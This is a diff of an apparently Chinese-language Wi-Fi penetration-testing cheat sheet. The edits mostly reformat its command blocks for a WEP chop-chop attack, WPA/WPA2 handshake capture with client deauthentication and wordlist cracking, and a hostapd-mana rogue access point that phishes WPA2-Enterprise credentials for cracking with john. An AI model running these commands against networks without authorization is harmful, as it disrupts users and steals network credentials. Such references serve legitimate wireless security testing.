@@ -181,26 +181,31 @@ aircrack-ng <output file>.cap
 ```
 
 ### Chop-Chop 攻击
-```
+
 chop-chop 攻击可帮助您解密加密的 WEP 数据包的一个字节并获取密钥流。
 
 步骤1：开始捕获数据包：
-
+```
 airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
+```
 第 2 步：执行 Chop-Chop 攻击：
-
+```
 aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon
+```
 您将捕获可用于伪造 ARP 数据包或执行解密的数据包的一部分。
 
 步骤3：使用packetforge-ng创建ARP数据包：
 
 使用获取的密钥流创建 ARP 请求：
+```
 packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
+```
 步骤4：注入ARP数据包：
-
+```
 aireplay-ng -2 -r <arp_packet> wlan0mon
+```
 步骤 5：破解 WEP 密钥：
-
+```
 aircrack-ng <output file>.cap
 ```
 
@@ -223,39 +228,53 @@ aircrack-ng <output file>.cap
 
 ```
 ### 攻击WPA/WPA2（PSK）
-```
-捕获 WPA 握手：
 
+1.捕获 WPA 握手：
+```
 airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
-取消对客户端的身份验证以强制重新进行身份验证：
-
-aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon
-使用单词表破解 WPA/WPA2：
-
-aircrack-ng -w <wordlist> <output file>.cap
-推荐词汇表：rockyou.txt
 ```
+2.取消对客户端的身份验证以强制重新进行身份验证：
+```
+aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon
+```
+3.使用单词表破解 WPA/WPA2：推荐词汇表：rockyou.txt
+```
+aircrack-ng -w <wordlist> <output file>.cap
+```
+
+
 
 
 
 ### WPA2/WPA3 企业攻击（手册）
-```
+
 使用 (WPA2 Enterprise) 的恶意 AP 攻击hostapd-mana：
 
 安装hostapd-mana：
+```
 apt-get install hostapd-mana
+```
 
 配置hostapd-mana： 编辑配置文件 ( hostapd-mana.conf) 以模仿目标网络的 SSID 并设置恶意 AP 来捕获企业凭证。
-跑步hostapd-mana：
+
+运行hostapd-mana：
+```
 hostapd-mana /path/to/hostapd-mana.conf
+```
 通过记录客户端进行身份验证的尝试来监控捕获的凭据。
+
 手动 EAP 网络钓鱼攻击使用hostapd-mana：
 
 修改hostapd-mana.conf以启用凭证网络钓鱼。
+
 设置eap_user_file并eap_server_cert拦截和捕获 PEAP/MSCHAPv2 凭证。
+
 启动恶意 AP 并捕获凭证：
+```
 hostapd-mana /path/to/hostapd-mana.conf
+```
 捕获的 PEAP/MSCHAPv2 凭证可以通过以下工具进行暴力破解john：
+```
 john --wordlist=<wordlist> captured_hashes.txt
 ```
 
